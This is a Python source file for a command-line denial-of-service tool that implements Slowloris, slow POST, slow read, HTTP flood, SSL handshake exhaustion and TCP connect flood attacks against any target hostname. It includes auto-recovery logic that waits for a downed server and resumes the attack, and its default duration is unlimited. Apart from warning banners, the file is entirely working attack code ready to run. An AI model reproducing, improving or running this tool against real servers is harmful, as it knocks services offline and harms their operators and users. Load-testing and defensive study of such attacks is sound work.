#!/usr/bin/env python3
"""
Slow HTTP Attack Agent - Enhanced Version with All Attack Methods
Purpose: Educational and Authorized Penetration Testing Only

⚠️  WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️
Unauthorized use against systems you don't own is ILLEGAL!
"""

import socket
import threading
import time
import sys
import random
import string
import signal
import argparse
import logging
from urllib.parse import urlparse
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
import json
import ssl
import struct

# Version Information
VERSION = "5.0"
BUILD_DATE = "2025-01-04"
AUTHOR = "NinjaTech Security Team"

# Try to import optional dependencies
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    import dns.resolver
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


@dataclass
class AttackStats:
    """Thread-safe attack statistics"""
    connections_active: int = 0
    packets_sent: int = 0
    bytes_sent: int = 0
    error_count: int = 0
    
    def to_dict(self) -> Dict:
        return {
            'connections_active': self.connections_active,
            'packets_sent': self.packets_sent,
            'bytes_sent': self.bytes_sent,
            'error_count': self.error_count
        }


class ThreadSafeStats:
    """Thread-safe statistics manager"""
    
    def __init__(self):
        self.stats = AttackStats()
        self._lock = threading.Lock()
    
    def increment(self, key: str, value: int = 1):
        """Increment a stat value"""
        with self._lock:
            current = getattr(self.stats, key)
            setattr(self.stats, key, current + value)
    
    def decrement(self, key: str, value: int = 1):
        """Decrement a stat value"""
        with self._lock:
            current = getattr(self.stats, key)
            setattr(self.stats, key, max(0, current - value))
    
    def set(self, key: str, value: int):
        """Set a stat value"""
        with self._lock:
            setattr(self.stats, key, value)
    
    def get(self, key: str) -> int:
        """Get a stat value"""
        with self._lock:
            return getattr(self.stats, key)
    
    def get_all(self) -> Dict:
        """Get all stats"""
        with self._lock:
            return self.stats.to_dict()


class TargetHealthMonitor:
    """Monitor target health and handle reconnection"""
    
    def __init__(self, host: str, port: int, use_ssl: bool = False):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.is_alive = False
        self.consecutive_failures = 0
        self.max_failures_before_wait = 3
        self.wait_time = 10  # seconds
        
    def check_target(self) -> bool:
        """Check if target is responsive"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((self.host, self.port))
            sock.close()
            
            if result == 0:
                self.is_alive = True
                self.consecutive_failures = 0
                return True
            else:
                self.is_alive = False
                self.consecutive_failures += 1
                return False
        except Exception as e:
            self.is_alive = False
            self.consecutive_failures += 1
            logger.debug(f"Target check failed: {e}")
            return False
    
    def wait_for_recovery(self):
        """Wait for target to recover"""
        logger.info(f"[RECOVERY] Target appears down. Waiting {self.wait_time}s before retry...")
        time.sleep(self.wait_time)
        
        # Try to check if target is back
        retry_count = 0
        max_retries = 5
        
        while retry_count < max_retries:
            logger.info(f"[RECOVERY] Checking target status (attempt {retry_count + 1}/{max_retries})...")
            if self.check_target():
                logger.info("[RECOVERY] Target is back online! Resuming attack...")
                return True
            
            retry_count += 1
            if retry_count < max_retries:
                time.sleep(self.wait_time)
        
        logger.warning("[RECOVERY] Target still down after multiple attempts")
        return False


class SlowHTTPAttack:
    """Enhanced Slow HTTP Attack with auto-recovery"""
    
    def __init__(
        self,
        host: str,
        port: int = 80,
        use_ssl: bool = False,
        max_memory_mb: int = 512
    ):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        
        # Connection management
        self.conns: List[socket.socket] = []
        self.running = False
        self.lock = threading.Lock()
        
        # Statistics
        self.stats = ThreadSafeStats()
        
        # Health monitoring
        self.health_monitor = TargetHealthMonitor(host, port, use_ssl)
        
        # User agents
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0"
        ]
        
        logger.info(f"Initialized attack on {host}:{port} (SSL: {use_ssl})")
    
    def create_socket(self) -> Optional[socket.socket]:
        """Create and connect socket with retry logic"""
        max_retries = 3
        retry_count = 0
        
        while retry_count < max_retries:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(15)
                sock.connect((self.host, self.port))
                
                if self.use_ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=self.host)
                
                return sock
                
            except (socket.timeout, socket.error, ConnectionRefusedError, OSError) as e:
                retry_count += 1
                logger.debug(f"Socket creation failed (attempt {retry_count}/{max_retries}): {e}")
                
                if retry_count >= max_retries:
                    # Check if target is down
                    if not self.health_monitor.check_target():
                        logger.warning("[AUTO-RECOVERY] Target appears down, initiating recovery...")
                        if self.health_monitor.wait_for_recovery():
                            # Target recovered, reset retry count
                            retry_count = 0
                            continue
                    
                    self.stats.increment('error_count')
                    return None
                
                time.sleep(1)
            except Exception as e:
                logger.error(f"Unexpected error creating socket: {e}")
                self.stats.increment('error_count')
                return None
        
        return None
    
    def close_socket(self, sock: socket.socket):
        """Safely close socket"""
        try:
            sock.close()
        except Exception:
            pass
    
    def slowloris_attack(
        self,
        num_conns: int = 100,
        delay: int = 15,
        duration: int = 0
    ):
        """Slowloris attack with auto-recovery"""
        logger.info(f"[SLOWLORIS] Starting attack on {self.host}:{self.port}")
        logger.info(f"[CONFIG] Connections: {num_conns}, Delay: {delay}s, Duration: {duration}s")
        
        self.running = True
        start_time = time.time()
        
        # Setup signal handler
        def signal_handler(sig, frame):
            logger.info("Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        try:
            # Phase 1: Create initial connections
            logger.info("[PHASE1] Creating initial connections...")
            
            for i in range(num_conns):
                if not self.running:
                    break
                
                sock = self.create_socket()
                if sock:
                    try:
                        request = self._build_slowloris_request()
                        sock.send(request.encode())
                        
                        with self.lock:
                            self.conns.append(sock)
                        
                        self.stats.increment('connections_active')
                        self.stats.increment('packets_sent')
                        self.stats.increment('bytes_sent', len(request))
                        
                        if (i + 1) % 100 == 0:
                            logger.info(f"[PROGRESS] {i+1}/{num_conns} connections created")
                    
                    except Exception as e:
                        logger.debug(f"Error sending initial request: {e}")
                        self.close_socket(sock)
                        self.stats.increment('error_count')
                
                if i % 100 == 0:
                    time.sleep(0.1)
            
            logger.info(f"[PHASE1] Complete. Active connections: {len(self.conns)}")
            
            # Phase 2: Keep connections alive
            logger.info("[PHASE2] Starting keep-alive phase...")
            cycle_count = 0
            
            while self.running:
                # Check duration
                if duration > 0 and (time.time() - start_time) >= duration:
                    logger.info("Duration limit reached, stopping attack")
                    break
                
                cycle_count += 1
                failed_socks = []
                
                with self.lock:
                    conns_copy = self.conns.copy()
                
                for sock in conns_copy:
                    if not self.running:
                        break
                    
                    try:
                        header = self._build_partial_header()
                        sock.send(header.encode())
                        
                        self.stats.increment('packets_sent')
                        self.stats.increment('bytes_sent', len(header))
                    
                    except Exception:
                        failed_socks.append(sock)
                        self.stats.increment('error_count')
                
                # Replace failed connections
                for sock in failed_socks:
                    with self.lock:
                        if sock in self.conns:
                            self.conns.remove(sock)
                    
                    self.close_socket(sock)
                    self.stats.decrement('connections_active')
                    
                    # Try to create replacement
                    new_sock = self.create_socket()
                    if new_sock:
                        try:
                            request = self._build_slowloris_request()
                            new_sock.send(request.encode())
                            
                            with self.lock:
                                self.conns.append(new_sock)
                            
                            self.stats.increment('connections_active')
                            self.stats.increment('packets_sent')
                            self.stats.increment('bytes_sent', len(request))
                        except Exception:
                            self.close_socket(new_sock)
                
                # Print status
                stats = self.stats.get_all()
                logger.info(
                    f"[CYCLE {cycle_count}] Active: {stats['connections_active']} | "
                    f"Packets: {stats['packets_sent']} | "
                    f"Errors: {stats['error_count']}"
                )
                
                time.sleep(delay)
        
        finally:
            self.stop_attack()
            logger.info("[COMPLETE] Attack finished")
    
    def slow_post_attack(
        self,
        num_conns: int = 50,
        delay: int = 10,
        duration: int = 0
    ):
        """Slow POST (R.U.D.Y) attack with auto-recovery"""
        logger.info(f"[R.U.D.Y] Starting Slow POST attack on {self.host}:{self.port}")
        logger.info(f"[CONFIG] Connections: {num_conns}, Delay: {delay}s, Duration: {duration}s")
        
        self.running = True
        start_time = time.time()
        
        # Setup signal handler
        def signal_handler(sig, frame):
            logger.info("Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        try:
            content_length = random.randint(10000000, 100000000)
            
            # Create initial connections
            logger.info("[PHASE1] Creating POST connections...")
            
            for i in range(num_conns):
                if not self.running:
                    break
                
                sock = self.create_socket()
                if sock:
                    try:
                        request = self._build_slow_post_request(content_length)
                        sock.send(request.encode())
                        
                        with self.lock:
                            self.conns.append(sock)
                        
                        self.stats.increment('connections_active')
                        self.stats.increment('packets_sent')
                        self.stats.increment('bytes_sent', len(request))
                        
                        if (i + 1) % 50 == 0:
                            logger.info(f"[PROGRESS] {i+1}/{num_conns} connections created")
                    
                    except Exception as e:
                        logger.debug(f"Error sending POST request: {e}")
                        self.close_socket(sock)
                        self.stats.increment('error_count')
                
                if i % 50 == 0:
                    time.sleep(0.1)
            
            logger.info(f"[PHASE1] Complete. Active connections: {len(self.conns)}")
            
            # Phase 2: Send data slowly
            logger.info("[PHASE2] Starting slow data transmission...")
            cycle_count = 0
            
            while self.running:
                if duration > 0 and (time.time() - start_time) >= duration:
                    logger.info("Duration limit reached, stopping attack")
                    break
                
                cycle_count += 1
                failed_socks = []
                
                with self.lock:
                    conns_copy = self.conns.copy()
                
                for sock in conns_copy:
                    if not self.running:
                        break
                    
                    try:
                        # Send one byte of data
                        data = random.choice(string.ascii_letters).encode()
                        sock.send(data)
                        
                        self.stats.increment('packets_sent')
                        self.stats.increment('bytes_sent', 1)
                    
                    except Exception:
                        failed_socks.append(sock)
                        self.stats.increment('error_count')
                
                # Replace failed connections
                for sock in failed_socks:
                    with self.lock:
                        if sock in self.conns:
                            self.conns.remove(sock)
                    
                    self.close_socket(sock)
                    self.stats.decrement('connections_active')
                    
                    new_sock = self.create_socket()
                    if new_sock:
                        try:
                            request = self._build_slow_post_request(content_length)
                            new_sock.send(request.encode())
                            
                            with self.lock:
                                self.conns.append(new_sock)
                            
                            self.stats.increment('connections_active')
                            self.stats.increment('packets_sent')
                            self.stats.increment('bytes_sent', len(request))
                        except Exception:
                            self.close_socket(new_sock)
                
                stats = self.stats.get_all()
                logger.info(
                    f"[CYCLE {cycle_count}] Active: {stats['connections_active']} | "
                    f"Packets: {stats['packets_sent']} | "
                    f"Errors: {stats['error_count']}"
                )
                
                time.sleep(delay)
        
        finally:
            self.stop_attack()
            logger.info("[COMPLETE] Attack finished")
    
    def slow_read_attack(
        self,
        num_conns: int = 100,
        delay: int = 10,
        duration: int = 0
    ):
        """Slow Read attack with auto-recovery"""
        logger.info(f"[SLOW-READ] Starting attack on {self.host}:{self.port}")
        logger.info(f"[CONFIG] Connections: {num_conns}, Delay: {delay}s, Duration: {duration}s")
        
        self.running = True
        start_time = time.time()
        
        # Setup signal handler
        def signal_handler(sig, frame):
            logger.info("Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        try:
            logger.info("[PHASE1] Creating connections...")
            
            for i in range(num_conns):
                if not self.running:
                    break
                
                sock = self.create_socket()
                if sock:
                    try:
                        # Set small receive buffer
                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)
                        
                        request = self._build_complete_request()
                        sock.send(request.encode())
                        
                        with self.lock:
                            self.conns.append(sock)
                        
                        self.stats.increment('connections_active')
                        self.stats.increment('packets_sent')
                        self.stats.increment('bytes_sent', len(request))
                        
                        if (i + 1) % 100 == 0:
                            logger.info(f"[PROGRESS] {i+1}/{num_conns} connections created")
                    
                    except Exception as e:
                        logger.debug(f"Error creating slow read connection: {e}")
                        self.close_socket(sock)
                        self.stats.increment('error_count')
                
                if i % 100 == 0:
                    time.sleep(0.1)
            
            logger.info(f"[PHASE1] Complete. Active connections: {len(self.conns)}")
            
            # Phase 2: Read slowly
            logger.info("[PHASE2] Starting slow read phase...")
            cycle_count = 0
            
            while self.running:
                if duration > 0 and (time.time() - start_time) >= duration:
                    logger.info("Duration limit reached, stopping attack")
                    break
                
                cycle_count += 1
                failed_socks = []
                
                with self.lock:
                    conns_copy = self.conns.copy()
                
                for sock in conns_copy:
                    if not self.running:
                        break
                    
                    try:
                        # Read one byte slowly
                        sock.recv(1)
                        self.stats.increment('packets_sent')
                    
                    except socket.timeout:
                        pass
                    except Exception:
                        failed_socks.append(sock)
                        self.stats.increment('error_count')
                
                # Replace failed connections
                for sock in failed_socks:
                    with self.lock:
                        if sock in self.conns:
                            self.conns.remove(sock)
                    
                    self.close_socket(sock)
                    self.stats.decrement('connections_active')
                    
                    new_sock = self.create_socket()
                    if new_sock:
                        try:
                            new_sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)
                            request = self._build_complete_request()
                            new_sock.send(request.encode())
                            
                            with self.lock:
                                self.conns.append(new_sock)
                            
                            self.stats.increment('connections_active')
                            self.stats.increment('packets_sent')
                            self.stats.increment('bytes_sent', len(request))
                        except Exception:
                            self.close_socket(new_sock)
                
                stats = self.stats.get_all()
                logger.info(
                    f"[CYCLE {cycle_count}] Active: {stats['connections_active']} | "
                    f"Packets: {stats['packets_sent']} | "
                    f"Errors: {stats['error_count']}"
                )
                
                time.sleep(delay)
        
        finally:
            self.stop_attack()
            logger.info("[COMPLETE] Attack finished")
    
    def http_flood_attack(
        self,
        num_conns: int = 100,
        requests_per_conn: int = 100,
        duration: int = 0
    ):
        """HTTP Flood attack with auto-recovery"""
        logger.info(f"[HTTP-FLOOD] Starting attack on {self.host}:{self.port}")
        logger.info(f"[CONFIG] Connections: {num_conns}, Requests/conn: {requests_per_conn}, Duration: {duration}s")
        
        self.running = True
        start_time = time.time()
        
        def signal_handler(sig, frame):
            logger.info("Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        def flood_worker():
            """Worker thread for flooding"""
            while self.running:
                if duration > 0 and (time.time() - start_time) >= duration:
                    break
                
                sock = self.create_socket()
                if sock:
                    try:
                        for _ in range(requests_per_conn):
                            if not self.running:
                                break
                            
                            request = self._build_complete_request()
                            sock.send(request.encode())
                            
                            self.stats.increment('packets_sent')
                            self.stats.increment('bytes_sent', len(request))
                        
                        self.close_socket(sock)
                    
                    except Exception:
                        self.stats.increment('error_count')
                        self.close_socket(sock)
        
        try:
            logger.info("[STARTING] Launching flood threads...")
            
            threads = []
            for i in range(num_conns):
                t = threading.Thread(target=flood_worker)
                t.daemon = True
                t.start()
                threads.append(t)
            
            # Monitor progress
            while self.running and any(t.is_alive() for t in threads):
                if duration > 0 and (time.time() - start_time) >= duration:
                    logger.info("Duration limit reached, stopping attack")
                    self.running = False
                    break
                
                stats = self.stats.get_all()
                logger.info(
                    f"[STATUS] Packets: {stats['packets_sent']} | "
                    f"Bytes: {stats['bytes_sent']} | "
                    f"Errors: {stats['error_count']}"
                )
                
                time.sleep(5)
            
            # Wait for threads
            for t in threads:
                t.join(timeout=1)
        
        finally:
            self.stop_attack()
            logger.info("[COMPLETE] Attack finished")
    
    def ssl_exhaust_attack(
        self,
        num_conns: int = 100,
        delay: int = 1,
        duration: int = 0
    ):
        """SSL Exhaustion attack with auto-recovery"""
        if not self.use_ssl:
            logger.error("SSL Exhaustion requires SSL/TLS target")
            return
        
        logger.info(f"[SSL-EXHAUST] Starting attack on {self.host}:{self.port}")
        logger.info(f"[CONFIG] Connections: {num_conns}, Delay: {delay}s, Duration: {duration}s")
        
        self.running = True
        start_time = time.time()
        
        def signal_handler(sig, frame):
            logger.info("Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        try:
            cycle_count = 0
            
            while self.running:
                if duration > 0 and (time.time() - start_time) >= duration:
                    logger.info("Duration limit reached, stopping attack")
                    break
                
                cycle_count += 1
                
                # Create SSL connections rapidly
                for i in range(num_conns):
                    if not self.running:
                        break
                    
                    sock = self.create_socket()
                    if sock:
                        self.stats.increment('connections_active')
                        self.close_socket(sock)
                        self.stats.decrement('connections_active')
                        self.stats.increment('packets_sent')
                
                stats = self.stats.get_all()
                logger.info(
                    f"[CYCLE {cycle_count}] SSL Handshakes: {stats['packets_sent']} | "
                    f"Errors: {stats['error_count']}"
                )
                
                time.sleep(delay)
        
        finally:
            self.stop_attack()
            logger.info("[COMPLETE] Attack finished")
    
    def tcp_flood_attack(
        self,
        target_port: int,
        num_packets: int = 1000,
        duration: int = 0
    ):
        """TCP Flood attack with auto-recovery"""
        logger.info(f"[TCP-FLOOD] Starting attack on {self.host}:{target_port}")
        logger.info(f"[CONFIG] Packets: {num_packets}, Duration: {duration}s")
        
        self.running = True
        start_time = time.time()
        
        def signal_handler(sig, frame):
            logger.info("Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        try:
            cycle_count = 0
            
            while self.running:
                if duration > 0 and (time.time() - start_time) >= duration:
                    logger.info("Duration limit reached, stopping attack")
                    break
                
                cycle_count += 1
                
                for i in range(num_packets):
                    if not self.running:
                        break
                    
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        sock.connect((self.host, target_port))
                        sock.close()
                        
                        self.stats.increment('packets_sent')
                    
                    except Exception:
                        self.stats.increment('error_count')
                
                stats = self.stats.get_all()
                logger.info(
                    f"[CYCLE {cycle_count}] TCP Packets: {stats['packets_sent']} | "
                    f"Errors: {stats['error_count']}"
                )
                
                time.sleep(0.1)
        
        finally:
            self.stop_attack()
            logger.info("[COMPLETE] Attack finished")
    
    def _build_slowloris_request(self) -> str:
        """Build incomplete HTTP request for Slowloris"""
        request = f"GET /?{random.randint(1000, 9999)} HTTP/1.1\r\n"
        request += f"Host: {self.host}\r\n"
        request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
        request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        request += "Accept-Language: en-US,en;q=0.5\r\n"
        request += "Accept-Encoding: gzip, deflate\r\n"
        request += "Connection: keep-alive\r\n"
        request += "Cache-Control: no-cache\r\n"
        return request
    
    def _build_partial_header(self) -> str:
        """Build partial header for keep-alive"""
        header_name = ''.join(random.choices(string.ascii_letters, k=random.randint(10, 20)))
        header_value = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(20, 50)))
        return f"X-{header_name}: {header_value}\r\n"
    
    def _build_slow_post_request(self, content_length: int) -> str:
        """Build POST request with large content-length"""
        request = f"POST /?{random.randint(1000, 9999)} HTTP/1.1\r\n"
        request += f"Host: {self.host}\r\n"
        request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
        request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        request += "Accept-Language: en-US,en;q=0.5\r\n"
        request += "Accept-Encoding: gzip, deflate\r\n"
        request += "Connection: keep-alive\r\n"
        request += "Content-Type: application/x-www-form-urlencoded\r\n"
        request += f"Content-Length: {content_length}\r\n"
        request += "\r\n"
        return request
    
    def _build_complete_request(self) -> str:
        """Build complete HTTP request"""
        request = f"GET /?{random.randint(1000, 9999)} HTTP/1.1\r\n"
        request += f"Host: {self.host}\r\n"
        request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
        request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        request += "Accept-Language: en-US,en;q=0.5\r\n"
        request += "Accept-Encoding: gzip, deflate\r\n"
        request += "Connection: keep-alive\r\n"
        request += "X-Requested-With: XMLHttpRequest\r\n"
        request += "\r\n"
        return request
    
    def stop_attack(self):
        """Stop attack and cleanup"""
        self.running = False
        
        with self.lock:
            for sock in self.conns:
                self.close_socket(sock)
            self.conns.clear()
        
        self.stats.set('connections_active', 0)
        
        final_stats = self.stats.get_all()
        logger.info(f"[FINAL STATS] {json.dumps(final_stats, indent=2)}")


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description=f"Slow HTTP Attack Agent v{VERSION} - Enhanced Version",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --target example.com --attack slowloris
  %(prog)s --target https://example.com --attack slow_post --connections 50
  %(prog)s --target example.com --port 8080 --attack slow_read --duration 300
  %(prog)s --target example.com --attack http_flood --connections 100
  %(prog)s --target https://example.com --attack ssl_exhaust
  %(prog)s --target example.com --attack tcp_flood --port 80

⚠️  WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY!
        """
    )
    
    parser.add_argument('--target', required=True, help='Target hostname or URL')
    parser.add_argument('--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('--ssl', action='store_true', help='Use SSL/TLS')
    parser.add_argument(
        '--attack',
        choices=['slowloris', 'slow_post', 'slow_read', 'http_flood', 'ssl_exhaust', 'tcp_flood'],
        default='slowloris',
        help='Attack type (default: slowloris)'
    )
    parser.add_argument('--connections', type=int, default=100, help='Number of connections (default: 100)')
    parser.add_argument('--delay', type=int, default=15, help='Delay between packets in seconds (default: 15)')
    parser.add_argument('--duration', type=int, default=0, help='Attack duration in seconds (0 = unlimited)')
    parser.add_argument('--max-memory', type=int, default=512, help='Maximum memory usage in MB (default: 512)')
    parser.add_argument('--version', action='version', version=f'%(prog)s {VERSION}')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose logging')
    
    args = parser.parse_args()
    
    # Set logging level
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Parse target
    if args.target.startswith(('http://', 'https://')):
        parsed = urlparse(args.target)
        target_host = parsed.netloc
        use_ssl = parsed.scheme == 'https'
        port = parsed.port or (443 if use_ssl else 80)
    else:
        target_host = args.target
        use_ssl = args.ssl
        port = args.port
    
    # Display warning
    print("\n" + "="*70)
    print("⚠️  WARNING: EDUCATIONAL AND AUTHORIZED TESTING ONLY!")
    print("="*70)
    print(f"Target: {target_host}:{port}")
    print(f"Attack: {args.attack}")
    print(f"Connections: {args.connections}")
    print(f"Duration: {'unlimited' if args.duration == 0 else f'{args.duration}s'}")
    print("="*70 + "\n")
    
    # Create attacker
    attacker = SlowHTTPAttack(
        target_host,
        port,
        use_ssl,
        args.max_memory
    )
    
    try:
        # Launch attack
        if args.attack == 'slowloris':
            attacker.slowloris_attack(args.connections, args.delay, args.duration)
        elif args.attack == 'slow_post':
            attacker.slow_post_attack(args.connections, args.delay, args.duration)
        elif args.attack == 'slow_read':
            attacker.slow_read_attack(args.connections, args.delay, args.duration)
        elif args.attack == 'http_flood':
            attacker.http_flood_attack(args.connections, 100, args.duration)
        elif args.attack == 'ssl_exhaust':
            attacker.ssl_exhaust_attack(args.connections, args.delay, args.duration)
        elif args.attack == 'tcp_flood':
            attacker.tcp_flood_attack(port, 1000, args.duration)
    
    except KeyboardInterrupt:
        print("\n[INTERRUPTED] Stopping attack...")
        attacker.stop_attack()
    except Exception as e:
        logger.error(f"[ERROR] {e}")
        attacker.stop_attack()
    finally:
        print("[CLEANUP] Attack completed")


if __name__ == "__main__":
    main()
